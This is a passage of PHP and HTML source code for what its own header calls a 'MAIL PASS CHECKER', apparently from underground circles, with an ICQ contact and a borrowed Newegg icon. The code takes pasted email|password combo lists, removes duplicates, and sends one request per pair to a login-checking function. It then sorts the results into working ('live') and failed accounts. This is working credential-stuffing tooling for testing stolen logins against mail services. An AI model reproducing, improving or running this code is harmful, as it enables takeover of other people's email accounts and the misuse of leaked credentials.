                $result = "Unknows Mail $domain";
            }
        }
        else
        {
            $result = "Invaild email address";
        }
        flush();
        return $result;
    }
   
    
       $mail = urldecode($_GET['mail']);	$pass = urldecode($_GET['pass']);
       check($mail,$pass);
}
else {
	@ini_set("display_errors","OFF");
	@ini_set("session.bug_compat_warn","0");
	function info($mailline)
	{
		$MPRam	=	explode("|", $mailline);
		foreach($MPRam as $key=>$vl){
			if(strpos($vl,'@')){
				$pp['mail']	=	trim($MPRam[$key]);
				$pp['pass']	=	trim($MPRam[$key+1]);
			}
		}
		if(isset($pp['mail']) && preg_match('/^[^\W][a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\@[a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\.[a-zA-Z]{2,4}$/',$pp['mail']) && isset($pp['pass']) && (strlen($pp['pass']) >= 3 )) return $pp;
	}
	
	function removedupe($mailpass)
	{
		$mailpass = explode("\n",$mailpass);
		foreach($mailpass as $mailline)
		{
			$MPRam	=	explode("|", $mailline);
			foreach($MPRam as $key=>$vl){
				if(strpos($vl,'@')){
					$pp['mail']	=	trim($MPRam[$key]);
					$pp['pass']	=	trim($MPRam[$key+1]);
				}
			}
			if(isset($pp['mail']) && preg_match('/^[^\W][a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\@[a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\.[a-zA-Z]{2,4}$/',$pp['mail']) && isset($pp['pass']) && (strlen($pp['pass']) >= 3 ))
			{
				if(!isset($CheckMP[$pp['mail']]))
				{
					$CheckMP[$pp['mail']] = true;
					$New[] = $pp['mail']."|".$pp['pass'];
				}
			}
		}
		return $New;
	}
	if(isset($_POST['mailpass']))
	{
		$mailpass = removedupe($_POST['mailpass']);
		flush();
		$RSM = "";
		if($mailpass) foreach ($mailpass as $mailline)
		{
			$RSM .= $mailline."\n";
			flush();
		}
	}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head><link rel="shortcut icon" type="image/x-icon" href="http://images10.newegg.com/WebResource/Themes/2005/Nest/Newegg.ico"><title>CDMA</title></head>
<style>
	*{margin:0;padding:0}#main{width:900px;margin:auto}#top{width:100%;height:50px;line-height:50px;color:#fff;background:#8441A5;text-align:center;font-weight:700}#form{width:100%;color:#fff;text-align:center;font-weight:700}input:focus{color:#ff0}.mailpass{width:100%;height:200px;color:#000;background:#aaa;font-weight:700;border:0;padding:5px 0px 0px 0px;}.submit{background:#0a5ac2;border:0;height:30px;width:200px;color:#fff;text-align:center;font-weight:700;float:left}#status{background:#8441A5;border:0;height:30px;width:700px;color:#fff;text-align:center;font-weight:700;float:left;line-height:30px}#checked{width:200px;background:#8441A5;float:left}#live{width:200px;background:#3FB618;float:left}#totals{width:200px;background:#b91c46;float:left}#show{width:100%;background:gray}#lives{width:50%;float:left;color:blue;font-weight:700;padding-top:15px}#dies{width:50%;float:left;color:red;font-weight:700;padding-top:15px}
</style>
<script>
function show(vl){
		document.getElementById("x_0").innerHTML = vl ;
	}
</script>
<script type="text/javascript">
var count = 1; var live=1;
function ajaxFunction(url)
{
   var xmlHttp;
   try
   { 
      xmlHttp=new XMLHttpRequest();  
   }
   catch (e)
      {
         alert("Your browser does not support AJAX!");
         return false;
      }
   xmlHttp.onreadystatechange=function()
   {
      if (xmlHttp.readyState==4 && xmlHttp.status==200)
      {
	   document.getElementById("x_1").innerHTML = count;
	   count++;
	   var n = xmlHttp.responseText;
	   var ns =n.indexOf("Success");
	   if(ns>1){
		document.getElementById("lives").innerHTML = document.getElementById("lives").innerHTML + n + "<br />" ;
		document.getElementById("x_2").innerHTML = live;
		live++;
	   }
	   else {
			document.getElementById("dies").innerHTML = document.getElementById("dies").innerHTML + n + "<br />" ;
	   }
      }
   }
   xmlHttp.open("GET",url,true);
   xmlHttp.send(null);  
}
</script>
<div id='main'>
	<div id='top'>
		MAIL PASS CHECKER WE DONT FUCK ANYMORE <b style="color:yellow;">® ICQ:659487271</b></br>
	</div>
	<div id='form'>
		<form method='POST' action=''>
			<textarea name='mailpass' placeholder='Enter Mail Pass Here !' class='mailpass'><?php if(!empty($RSM)){ echo $RSM;}?></textarea><br />
			<input name='submit' class='submit' value='SUBMIT' type='submit'>
			<div id='status'>
				<div id='totals'>
					TOTALS : <span id='x_0'>0</span>
				</div>
				<div id='checked'>
					CHECKED : <span id='x_1'>0</span>
				</div>
				<div id='live'>
					LIVE : <span id='x_2'>0</span>
				</div>
			</div>
		</form>
	</div>
	<div id='show'>
		<div id='lives'></div>
		<div id='dies'></div>
	</div>
</div>
<?php
	
	if(isset($mailpass)){
		$cmp = count($mailpass);
		echo "<script>show($cmp);</script>";
		foreach($mailpass as $vl){
			$mp = explode("|",$vl);
			$mail = urlencode(trim($mp[0])); $pass = urlencode(trim($mp[1]));
			echo "<script>ajaxFunction('index.php?mail=$mail&pass=$pass');</script>";
		}
	}
}
?>